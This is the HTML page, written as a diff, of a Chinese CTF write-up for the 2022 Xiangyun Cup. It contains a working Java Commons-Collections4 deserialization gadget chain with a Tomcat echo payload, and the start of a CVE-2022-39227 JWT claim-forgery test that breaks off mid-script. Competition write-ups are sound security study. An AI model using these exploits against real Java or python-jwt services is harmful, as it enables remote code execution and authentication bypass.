@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">[2022祥云杯] wp - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[2022祥云杯] wp" />
+<meta property="og:description" content="Webezjava/myTest路由可以直接反序列化 而且存在CC4.0，可以直接cc4打 yso本地打通，但是远程打不了，发现是不出网的，这里" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/xyb2022/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-31T10:27:38+08:00" />
+<meta property="article:modified_time" content="2022-10-31T10:27:38+08:00" /><meta property="og:site_name" content="Huamang&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="[2022祥云杯] wp"/>
+<meta name="twitter:description" content="Webezjava/myTest路由可以直接反序列化 而且存在CC4.0，可以直接cc4打 yso本地打通，但是远程打不了，发现是不出网的，这里"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://example.com/xyb2022/" /><link rel="prev" href="https://example.com/rome/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[2022祥云杯] wp",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/xyb2022\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1919 ,
+        "url": "https:\/\/example.com\/xyb2022\/","datePublished": "2022-10-31T10:27:38+08:00","dateModified": "2022-10-31T10:27:38+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  320 ,
+                    "height":  320 
+                }},"author": {
+                "@type": "Person",
+                "name": "Huamang"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="#" onclick="return false;" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" title="Select Language" id="language-select-desktop" onchange="location = this.value;"><option value="/xyb2022/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="#" onclick="return false;" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" title="Select Language" onchange="location = this.value;"><option value="/xyb2022/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#ezjava">ezjava</a></li>
+        <li><a href="#funweb">Funweb</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#strange_forensics">strange_forensics</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[2022祥云杯] wp</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Huamang</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-10-31">2022-10-31</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-10-31">2022-10-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1919 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#ezjava">ezjava</a></li>
+        <li><a href="#funweb">Funweb</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#strange_forensics">strange_forensics</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="web" class="headerLink">
+    <a href="#web" class="header-mark"></a>Web</h1><h2 id="ezjava" class="headerLink">
+    <a href="#ezjava" class="header-mark"></a>ezjava</h2><p>/myTest路由可以直接反序列化</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031103030205.png" title="image-20221031103030205" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031103030205.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031103030205.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031103030205.png, https://tuchuang.huamang.xyz/img/image-20221031103030205.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031103030205.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031103030205.png">
+    </a></p>
+<p>而且存在CC4.0，可以直接cc4打</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031103020988.png" title="image-20221031103020988" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031103020988.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031103020988.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031103020988.png, https://tuchuang.huamang.xyz/img/image-20221031103020988.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031103020988.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031103020988.png">
+    </a></p>
+<p>yso本地打通，但是远程打不了，发现是不出网的，这里打一个tomcat回显就可以了，拼接上CC4利用链</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Queue</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.InstantiateTransformer</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Reflections</span><span class="o">;</span>
+
+
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC4</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">base64Encode</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Base64</span><span class="o">.</span><span class="na">Encoder</span> <span class="n">encoder</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">();</span>
+        <span class="k">return</span> <span class="n">encoder</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">btout</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objOut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">btout</span><span class="o">);</span>
+        <span class="n">objOut</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">btout</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">deserialize</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">serialized</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ByteArrayInputStream</span> <span class="n">btin</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">serialized</span><span class="o">);</span>
+        <span class="n">ObjectInputStream</span> <span class="n">objIn</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">btin</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">objIn</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="k">return</span> <span class="n">o</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">argss</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Object</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">Evil</span><span class="o">.</span><span class="na">createTemplatesTomcatEcho</span><span class="o">();</span>
+
+        <span class="n">ConstantTransformer</span> <span class="n">constant</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+
+        <span class="c1">// mock method name until armed
+</span><span class="c1"></span>        <span class="n">Class</span><span class="o">[]</span>  <span class="n">paramTypes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">};</span>
+        <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span>       <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;su18&#34;</span><span class="o">};</span>
+        <span class="n">InstantiateTransformer</span> <span class="n">instantiate</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InstantiateTransformer</span><span class="o">(</span>
+                <span class="n">paramTypes</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+
+        <span class="c1">// grab defensively copied arrays
+</span><span class="c1"></span>        <span class="n">paramTypes</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">[])</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">instantiate</span><span class="o">,</span> <span class="s">&#34;iParamTypes&#34;</span><span class="o">);</span>
+        <span class="n">args</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">[])</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">instantiate</span><span class="o">,</span> <span class="s">&#34;iArgs&#34;</span><span class="o">);</span>
+
+        <span class="n">ChainedTransformer</span> <span class="n">chain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span><span class="n">constant</span><span class="o">,</span> <span class="n">instantiate</span><span class="o">});</span>
+
+        <span class="c1">// create queue with numbers
+</span><span class="c1"></span>        <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;(</span><span class="n">2</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="n">chain</span><span class="o">));</span>
+        <span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+        <span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+
+        <span class="c1">// swap in values to arm
+</span><span class="c1"></span>        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">constant</span><span class="o">,</span> <span class="s">&#34;iConstant&#34;</span><span class="o">,</span> <span class="n">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">paramTypes</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+        <span class="n">args</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">templates</span><span class="o">;</span>
+
+        <span class="n">String</span> <span class="n">b64</span> <span class="o">=</span> <span class="n">base64Encode</span><span class="o">(</span><span class="n">serialize</span><span class="o">(</span><span class="n">queue</span><span class="o">));</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">b64</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031111228244.png" title="image-20221031111228244" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031111228244.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031111228244.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031111228244.png, https://tuchuang.huamang.xyz/img/image-20221031111228244.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031111228244.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031111228244.png">
+    </a></p>
+<h2 id="funweb" class="headerLink">
+    <a href="#funweb" class="header-mark"></a>Funweb</h2><p>这个题目，找了好久的洞都没找到啥，后来仔细想了一下，这里用了jwt去做验证，而且获取admin权限是必须的，所以肯定得从jwt来下手，但是这里的jwt是用PS256算法的是非对称加密，不能直接爆破密钥，所以只能另寻他路，而这里爆出了个<a href="https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9" target="_blank" rel="noopener noreferrer">CVE-2022-39227</a></p>
+<blockquote>
+<p>jwcrypto accepts both compact and JSON formats.
+It was possible to use this to present a token with arbitrary
+claims with a signature from another valid token.</p>
+</blockquote>
+<p>而且官方直接给了测试脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">timedelta</span>
+<span class="kn">from</span> <span class="nn">json</span> <span class="kn">import</span> <span class="n">loads</span><span class="p">,</span> <span class="n">dumps</span>
+<span class="kn">from</span> <span class="nn">test.common</span> <span class="kn">import</span> <span class="n">generated_keys</span>
+<span class="kn">from</span> <span class="nn">test</span> <span class="kn">import</span> <span class="n">python_jwt</span> <span class="k">as</span> <span class="n">jwt</span>
+<span class="kn">from</span> <span class="nn">pyvows</span> <span class="kn">import</span> <span class="n">Vows</span><span class="p">,</span> <span class="n">expect</span>
+<span class="kn">from</span> <span class="nn">jwcrypto.common</span> <span class="kn">import</span> <span class="n">base64url_decode</span><span class="p">,</span> <span class="n">base64url_encode</span>
+
+<span class="nd">@Vows</span><span class="o">.</span><span class="n">batch</span>
+<span class="k">class</span> <span class="nc">ForgedClaims</span><span class="p">(</span><span class="n">Vows</span><span class="o">.</span><span class="n">Context</span><span class="p">):</span>
+    <span class="s2">&#34;&#34;&#34; Check we get an error when payload is forged using mix of compact and JSON formats &#34;&#34;&#34;</span>
+    <span class="k">def</span> <span class="nf">topic</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="s2">&#34;&#34;&#34; Generate token &#34;&#34;&#34;</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;sub&#39;</span><span class="p">:</span> <span class="s1">&#39;alice&#39;</span><span class="p">}</span>
+        <span class="k">return</span> <span class="n">jwt</span><span class="o">.</span><span class="n">generate_jwt</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">generated_keys</span><span class="p">[</span><span class="s1">&#39;PS256&#39;</span><span class="p">],</span> <span class="s1">&#39;PS256&#39;</span><span class="p">,</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">minutes</span><span class="o">=</span><span class="mi">60</span><span class="p">))</span>
+
+    <span class="k">class</span> <span class="nc">PolyglotToken</span><span class="p">(</span><span class="n">Vows</span><span class="o">.</span><span class="n">Context</span><span class="p">):</span>
+        <span class="s2">&#34;&#34;&#34; Make a forged token &#34;&#34;&#34;</span>
+        <span class="k">def</span> <span class="nf">topic</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">topic</span><span class="p">):</span>
+            <span class="s2">&#34;&#34;&#34; Use mix of JSON and compact format to insert forged claims including long expiration &#34;&#34;&#34;</span>
+            <span class="p">[</span><span class="n">header</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">signature</span><span class="p">]</span> <span class="o">=</span> <span class="n">topic</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
+            <span class="n">parsed_payload</span> <span class="o">=</span> <span class="n">loads</span><span class="p">(</span><span class="n">base64url_decode</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+            <span class="n">parsed_payload</span><span class="p">[</span><span class="s1">&#39;sub&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bob&#39;</span>
+            <span class="n">parsed_payload</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2000000000</span>
+            <span class="n">fake_payload</span> <span class="o">=</span> <span class="n">base64url_encode</span><span class="p">((</span><span class="n">dumps</span><span class="p">(</span><span class="n">parsed_payload</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">))))</span>
+            <span class="k">return</span> <span class="s1">&#39;{&#34;  &#39;</span> <span class="o">+</span> <span class="n">header</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">fake_payload</span> <span class="o">+</span> <span class="s1">&#39;.&#34;:&#34;&#34;,&#34;protected&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">header</span> <span class="o">+</span> <span class="s1">&#39;&#34;, &#34;payload&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s1">&#39;&#34;,&#34;signature&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">signature</span> <span class="o">+</span> <span class="s1">&#39;&#34;}&#39;</span>
+
+        <span class="k">class</span> <span class="nc">Verify</span><span class="p">(</span><span class="n">Vows</span><span class="o">.</span><span class="n">Context</span><span class="p">):</span>
+            <span class="s2">&#34;&#34;&#34; Check the forged token fails to verify &#34;&#34;&#34;</span>
+            <span class="nd">@Vows</span><span class="o">.</span><span class="n">capture_error</span>
+            <span class="k">def</span> <span class="nf">topic</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">topic</span><span class="p">):</span>
+                <span class="s2">&#34;&#34;&#34; Verify the forged token &#34;&#34;&#34;</span>
